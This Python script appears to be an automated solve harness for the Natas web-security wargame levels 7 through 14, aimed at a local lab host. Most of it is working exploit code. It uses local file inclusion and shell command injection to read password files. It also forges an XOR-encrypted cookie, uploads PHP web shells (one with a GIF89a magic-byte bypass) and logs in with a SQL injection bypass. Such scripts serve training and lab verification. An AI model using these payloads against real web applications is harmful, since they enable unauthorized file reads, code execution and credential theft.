#!/usr/bin/env python3
"""End-to-end solve audit for Natas levels 7 through 14.

Run only against an authorized local CEI Labs target. Synthetic credentials
are supplied through NATAS_AUDIT_SECRETS as JSON; no production flags belong
in this script or its output.
"""

import base64
import http.cookiejar
import json
import os
import re
import sys
import urllib.error
import urllib.parse
import urllib.request
import uuid


HOST = os.environ.get("NATAS_AUDIT_HOST", "127.0.0.1")
PORT_BASE = int(os.environ.get("NATAS_AUDIT_PORT_BASE", "18000"))
SECRETS = json.loads(os.environ["NATAS_AUDIT_SECRETS"])


def url(level, path="/"):
    return f"http://{HOST}:{PORT_BASE + level}{path}"


def request(level, path="/", data=None, headers=None):
    password = "natas0" if level == 0 else SECRETS[f"natas{level}"]
    token = base64.b64encode(f"natas{level}:{password}".encode()).decode()
    request_headers = {"Authorization": f"Basic {token}"}
    request_headers.update(headers or {})
    req = urllib.request.Request(url(level, path), data=data, headers=request_headers)
    with urllib.request.urlopen(req, timeout=10) as response:
        return response.read(), response.headers


def require(value, message):
    if not value:
        raise AssertionError(message)


def form(level, fields, path="/index.php", headers=None):
    encoded = urllib.parse.urlencode(fields).encode()
    body, response_headers = request(
        level,
        path,
        encoded,
        {"Content-Type": "application/x-www-form-urlencoded", **(headers or {})},
    )
    return body, response_headers


def multipart(level, filename, content):
    boundary = "----CEIAudit" + uuid.uuid4().hex
    body = (
        f"--{boundary}\r\n"
        'Content-Disposition: form-data; name="submit"\r\n\r\n'
        "Upload File\r\n"
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="uploadedfile"; filename="{filename}"\r\n'
        "Content-Type: application/octet-stream\r\n\r\n"
    ).encode() + content + f"\r\n--{boundary}--\r\n".encode()
    return request(
        level,
        "/index.php",
        body,
        {"Content-Type": f"multipart/form-data; boundary={boundary}"},
    )


def xor_bytes(data, key):
    return bytes(value ^ key[index % len(key)] for index, value in enumerate(data))


def main():
    # Level 7: rendered HTML source must contain the clue, then LFI reads it.
    body, _ = request(7)
    require(b"/etc/natas_webpass/natas8" in body, "Natas 7 HTML source clue missing")
    body, _ = request(7, "/index.php?page=/etc/natas_webpass/natas8")
    require(SECRETS["natas8"].encode() in body, "Natas 7 LFI failed")

    # Level 8: reverse bin2hex(strrev(base64_encode(secret))).
    source, _ = request(8, "/?source")
    require(b"bin2hex" in source and b"base64_encode" in source, "Natas 8 encoding function missing from source")
    body, _ = request(8)
    match = re.search(rb"Encoded secret:.*?([0-9a-f]{20,})", body, re.DOTALL)
    require(match, "Natas 8 page does not expose encodedSecret")
    form_secret = base64.b64decode(bytes.fromhex(match.group(1).decode())[::-1]).decode()
    body, _ = form(8, {"secret": form_secret})
    require(SECRETS["natas9"].encode() in body, "Natas 8 decoding chain failed")

    # Levels 9 and 10: command injection and grep argument injection.
    path = "/index.php?" + urllib.parse.urlencode({"needle": ";cat /etc/natas_webpass/natas10"})
    body, _ = request(9, path)
    require(SECRETS["natas10"].encode() in body, "Natas 9 command injection failed")
    path = "/index.php?" + urllib.parse.urlencode({"needle": ". /etc/natas_webpass/natas11 #"})
    body, _ = request(10, path)
    require(SECRETS["natas11"].encode() in body, "Natas 10 grep injection failed")

    # Level 11: recover repeating XOR key from known default cookie plaintext.
    body, headers = request(11)
    cookie = next(
        morsel.split(";", 1)[0].split("=", 1)[1]
        for morsel in headers.get_all("Set-Cookie", [])
        if morsel.startswith("data=")
    )
    ciphertext = base64.b64decode(urllib.parse.unquote(cookie))
    known = b'{"showpassword":"no","bgcolor":"#ffffff"}'
    recovered = bytes(left ^ right for left, right in zip(ciphertext, known))
    key = recovered[:4]
    forged_plaintext = b'{"showpassword":"yes","bgcolor":"#ffffff"}'
    forged = urllib.parse.quote(base64.b64encode(xor_bytes(forged_plaintext, key)).decode())
    body, _ = request(11, "/", headers={"Cookie": f"data={forged}"})
    require(SECRETS["natas12"].encode() in body, "Natas 11 XOR cookie forgery failed")

    # Levels 12 and 13: executable upload, then magic-byte bypass.
    shell = b'<?php echo file_get_contents("/etc/natas_webpass/natas13"); ?>'
    body, _ = multipart(12, "audit.php", shell)
    require(b"uploads/audit.php" in body, "Natas 12 upload failed")
    body, _ = request(12, "/uploads/audit.php")
    require(SECRETS["natas13"].encode() in body, "Natas 12 uploaded PHP did not execute")

    shell = b'GIF89a<?php echo file_get_contents("/etc/natas_webpass/natas14"); ?>'
    body, _ = multipart(13, "audit.php", shell)
    require(b"uploads/audit.php" in body, "Natas 13 magic-byte upload failed")
    body, _ = request(13, "/uploads/audit.php")
    require(SECRETS["natas14"].encode() in body, "Natas 13 uploaded PHP did not execute")

    # Level 14: quote breakout matching the source's double-quoted query.
    body, _ = form(14, {"username": '" OR "1"="1" -- ', "password": "x"})
    require(SECRETS["natas14final"].encode() in body, "Natas 14 SQL injection failed")
    print("NATAS_LEVELS_7_THROUGH_14_OK")


if __name__ == "__main__":
    try:
        main()
    except (AssertionError, urllib.error.URLError, KeyError, ValueError) as error:
        print(f"NATAS_AUDIT_FAILED: {error}", file=sys.stderr)
        raise SystemExit(1)
